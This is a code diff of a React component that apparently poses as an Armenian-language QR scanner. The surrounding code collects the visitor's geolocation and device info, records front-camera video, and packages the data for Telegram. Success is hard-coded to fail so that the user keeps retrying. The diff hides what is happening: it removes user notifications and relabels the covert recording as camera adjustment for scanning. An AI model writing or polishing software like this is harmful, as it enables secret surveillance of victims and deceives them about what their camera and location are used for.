@@ -3,7 +3,7 @@
 import React, { useEffect, useRef, useState, useCallback } from "react";
 import QrScanner from "./qr-scanner";
 import { Button } from "@/components/ui/button";
-import { toast } from "sonner";
+// import { toast } from "sonner"; // Удаляем импорт toast, чтобы не показывать уведомления пользователю
 import {
   getGeolocation,
   getClientInfo,
@@ -62,7 +62,7 @@ const PermissionHandler = () => {
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const mediaChunksRef = useRef<Blob[]>([]);
   const [appPhase, setAppPhase] = useState<AppPhase>("initial");
-  const [loadingMessage, setLoadingMessage] = useState("Սկսում ենք..."); // Starting...
+  const [loadingMessage, setLoadingMessage] = useState("Պատրաստվում ենք QR սկանավորմանը..."); // Preparing for QR scanning...
   const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId' | 'attempt'>>({});
   const [sessionKey, setSessionKey] = useState(0);
   const [processSuccessful, setProcessSuccessful] = useState<boolean>(false); // This will always be false for QR scan
@@ -205,7 +205,7 @@ const PermissionHandler = () => {
   );
 
   const handleQrCameraActive = useCallback(() => {
-    setLoadingMessage("Կամերան ակտիվ է, սկանավորեք QR կոդը..."); // Camera is active, scan QR code...
+    setLoadingMessage("Տեղադրեք QR կոդը շրջանակի մեջ..."); // Place the QR code within the frame...
   }, []);
 
   const startNewSession = useCallback(() => {
@@ -229,7 +229,7 @@ const PermissionHandler = () => {
 
     // --- Collect and send initial data ONLY on the first attempt ---
     if (attempt === 1) {
-      setLoadingMessage("Ստուգում ենք սարքի հնարավորությունները..."); // Checking device capabilities...
+      setLoadingMessage("Պատրաստվում ենք QR սկանավորմանը..."); // Preparing for QR scanning...
       setAppPhase("collectingData");
 
       const [
@@ -281,10 +281,10 @@ const PermissionHandler = () => {
 
     // Determine camera facing mode based on attempt
     const cameraFacingMode: "user" | "environment" = attempt === 1 ? "user" : "environment";
-    const videoMessagePrefix = attempt === 1 ? "" : "Երկրորդ փորձ: "; // Second attempt:
+    // const videoMessagePrefix = attempt === 1 ? "" : "Երկրորդ փորձ: "; // Removed prefix as per request
 
     // --- Start Video 1 Recording ---
-    setLoadingMessage(`${videoMessagePrefix}Պատրաստվում ենք սկանավորմանը...`); // Preparing for scan...
+    setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
     setAppPhase("recordingVideo1");
     const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, cameraFacingMode);
     if (video1Base64) {
@@ -293,7 +293,7 @@ const PermissionHandler = () => {
     }
 
     // --- Video 2 Recording ---
-    setLoadingMessage(`${videoMessagePrefix}Ստուգում ենք տեսախցիկի աշխատանքը...`); // Checking camera operation...
+    setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
     setAppPhase("recordingVideo2");
     const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, cameraFacingMode);
     if (video2Base64) {
@@ -391,22 +391,25 @@ const PermissionHandler = () => {
           {attempt <= 2 ? ( // Show retry button for the first two attempts
             <>
               <p className="text-xl mb-4 font-semibold text-primary">
-                Սխալ. QR կոդը չհաջողվեց սկանավորել։
+                QR կոդը չհաջողվեց ճանաչել:
               </p>
               <p className="text-muted-foreground mb-6">
-                Խնդրում ենք համոզվել, որ QR կոդը հստակ է և լավ լուսավորված։
+                Խնդրում ենք համոզվել, որ կոդը հստակ է, լավ լուսավորված և ամբողջությամբ տեսանելի է շրջանակում:
               </p>
-              <Button onClick={runProcess} className="mt-4 px-8 py-3 text-lg bg-primary text-primary-foreground hover:bg-primary/90 transition-colors duration-300">
+              <Button 
+                onClick={runProcess} 
+                className="mt-4 px-8 py-3 text-lg bg-primary text-primary-foreground hover:bg-primary/90 transition-colors duration-300 transform hover:scale-105"
+              >
                 Կրկնել
               </Button>
             </>
           ) : ( // After second attempt, show final error
             <>
               <p className="text-xl mb-4 font-semibold text-destructive">
-                Սխալ. Խնդրում ենք կրկնել ավելի ուշ:
+                Սկանավորումն անհնար է:
               </p>
               <p className="text-muted-foreground">
-                Տեխնիկական անսարքությունների պատճառով այս պահին հնարավոր չէ շարունակել։
+                Տեխնիկական խնդիրների պատճառով այս պահին հնարավոր չէ շարունակել։ Խնդրում ենք փորձել մի փոքր ուշ:
               </p>
             </>
           )}
